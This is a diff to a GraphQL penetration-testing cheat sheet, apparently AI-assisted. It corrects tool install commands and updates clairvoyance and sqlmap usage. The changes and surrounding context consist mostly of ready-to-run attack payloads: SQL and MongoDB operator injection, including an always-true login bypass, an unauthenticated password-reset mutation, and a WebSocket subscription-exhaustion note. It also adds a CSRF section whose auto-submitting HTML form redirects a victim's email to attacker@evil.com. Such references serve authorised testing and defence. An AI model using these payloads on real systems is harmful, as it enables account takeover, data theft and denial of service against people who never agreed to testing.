@@ -17,9 +17,9 @@ GraphQL API attack techniques — introspection enumeration, batching abuse, inj
 | `Burp Suite` | Intercept GraphQL requests, modify queries/mutations, test auth bypass |
 | `InQL` | Burp extension — introspection, schema visualization, automated query generation (BApp Store) |
 | `GraphQL Voyager` | Visual schema explorer from introspection JSON |
-| `graphw00f` | GraphQL fingerprinting — identify engine (Apollo, Hasura, etc.) — `pip3 install graphw00f` |
-| `clairvoyance` | Schema inference when introspection is disabled — `pip3 install clairvoyance` |
-| `graphqlmap` | Automated GraphQL exploitation — `pip3 install graphqlmap` |
+| `graphw00f` | GraphQL fingerprinting — identify engine (Apollo, Hasura, etc.) — `git clone https://github.com/dolevf/graphw00f` |
+| `clairvoyance` | Schema inference when introspection is disabled (needs a wordlist) — `pip3 install clairvoyance` |
+| `graphqlmap` | Automated GraphQL exploitation — `git clone https://github.com/swisskyrepo/GraphQLmap` |
 | `curl` | Manual query/mutation testing |
 
 ---
@@ -123,9 +123,9 @@ done
 curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ usr { id } }"}'
 # Error: "Did you mean user?" → reveals valid field name
 
-# Clairvoyance — brute-force schema via suggestions
+# Clairvoyance — brute-force schema via suggestions (needs a wordlist; URL is positional)
 pip3 install clairvoyance
-clairvoyance -u "http://<target>/graphql" -H "Content-Type: application/json" -o schema.json
+clairvoyance -o schema.json -w /usr/share/wordlists/graphql.txt "http://<target>/graphql"
 
 # Manual field guessing
 for field in user users admin getUser allUsers listUsers profile me account; do
@@ -151,17 +151,27 @@ curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d
 curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user(id: \"1; SELECT SLEEP(5)-- -\") { id } }"}'
 
 # Send to sqlmap via Burp request file
-# Save POST request to file, then:
-sqlmap -r graphql_request.txt --level 5 --risk 3 --batch --data '{"query":"{ user(id: \"*\") { id } }"}'
+# Save the POST request to a file, mark the injection point with * inside the
+# JSON body (e.g. "id": "1*"), then let -r read the body — do NOT also pass --data:
+sqlmap -r graphql_request.txt --level 5 --risk 3 --batch
 ```
 
 ### NoSQL Injection via GraphQL
 
-```bash
-# MongoDB operator injection
-curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user(username: {\"$regex\": \".*\"}) { id username password } }"}'
+> [!warning] You can't inline a Mongo operator object against a `String!` argument — GraphQL type-checks it and `$` isn't a legal name char, so `password: {$gt: ""}` errors at parse time. NoSQLi only lands when the value rides in through a **variable** typed as a custom `JSON`/`Object` scalar (or the resolver forwards raw input to the DB). Pass the operator object as the variable value:
 
-curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ login(username: \"admin\", password: {\"$gt\": \"\"}) { token } }"}'
+```bash
+# Operator injection via a variable typed as a JSON/Object scalar
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
+  "query": "query($u: JSON!) { user(username: $u) { id username password } }",
+  "variables": { "u": { "$regex": ".*" } }
+}'
+
+# Auth bypass — always-true operator as the password variable
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
+  "query": "mutation($p: JSON!) { login(username: \"admin\", password: $p) { token } }",
+  "variables": { "p": { "$gt": "" } }
+}'
 ```
 
 ### SSRF via GraphQL
@@ -190,6 +200,32 @@ curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -H
 # Unauthenticated mutation
 curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { resetPassword(email: \"admin@target.com\") { success token } }"}'
 ```
+
+---
+
+## CSRF via GraphQL
+
+If the endpoint accepts requests outside `application/json`, it likely skips the JSON preflight — a cross-site form can then fire a mutation using the victim's cookies.
+
+```bash
+# Server accepts form-encoded body → no preflight → CSRF-able
+curl -s -X POST "http://<target>/graphql" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data 'query=mutation{updateEmail(email:"attacker@evil.com"){success}}'
+
+# Some servers also accept queries over GET → trivially CSRF-able (and cacheable/loggable)
+curl -s "http://<target>/graphql?query=mutation%7BupdateEmail(email%3A%22attacker%40evil.com%22)%7Bsuccess%7D%7D"
+```
+
+```html
+<!-- Auto-submitting cross-site form (no custom headers = no preflight) -->
+<form action="http://<target>/graphql" method="POST">
+  <input name="query" value='mutation{updateEmail(email:"attacker@evil.com"){success}}'>
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+> [!note] Mitigation is to reject non-`application/json` content types and disable GET for mutations — so testing which content types the endpoint tolerates is the first CSRF check.
 
 ---
 
@@ -268,6 +304,8 @@ curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d
 
 # Subscription exhaustion (WebSocket-based)
 # Open many long-lived subscription connections to exhaust server threads/connections
+# NOTE: legacy servers use the graphql-ws subprotocol (connection_init/start, below);
+#       newer ones use graphql-transport-ws (connection_init/subscribe) — adjust accordingly
 python3 << 'EOF'
 import websocket, threading, time
 
@@ -289,7 +327,7 @@ EOF
 
 ---
 
-## Tools
+## Tooling & Recon Commands
 
 ```bash
 # GraphQL Voyager — visualize schema (paste introspection JSON)
@@ -301,22 +339,22 @@ EOF
 # Altair / GraphiQL — interactive query UI (if exposed)
 # Check: /graphiql  /playground  /altair  /api/explorer
 
-# graphw00f — fingerprint GraphQL engine
-pip3 install graphw00f
-graphw00f -f -t http://<target>/graphql
+# graphw00f — fingerprint GraphQL engine (run from the cloned repo)
+git clone https://github.com/dolevf/graphw00f && cd graphw00f
+python3 main.py -f -t http://<target>/graphql
 # Identifies: Apollo, Hasura, GraphQL-Java, Ariadne, Strawberry, etc.
 
-# Clairvoyance — schema recovery without introspection
+# Clairvoyance — schema recovery without introspection (URL positional, wordlist required)
 pip3 install clairvoyance
-clairvoyance -u http://<target>/graphql -o schema.json
+clairvoyance -o schema.json -w /usr/share/wordlists/graphql.txt http://<target>/graphql
 
 # graphql-cop — security audit tool
 pip3 install graphql-cop
 graphql-cop -t http://<target>/graphql
 
 # graphqlmap — automated exploitation (introspection, injection, dump)
-pip3 install graphqlmap
-graphqlmap -u http://<target>/graphql --method POST
+git clone https://github.com/swisskyrepo/GraphQLmap && cd GraphQLmap
+python3 graphqlmap.py -u http://<target>/graphql --method POST
 # Interactive shell: type 'help' for commands
 # dump_via_introspection — get full schema
 # dump_via_introspection | jq — pipe to jq for parsing
@@ -346,5 +384,5 @@ curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
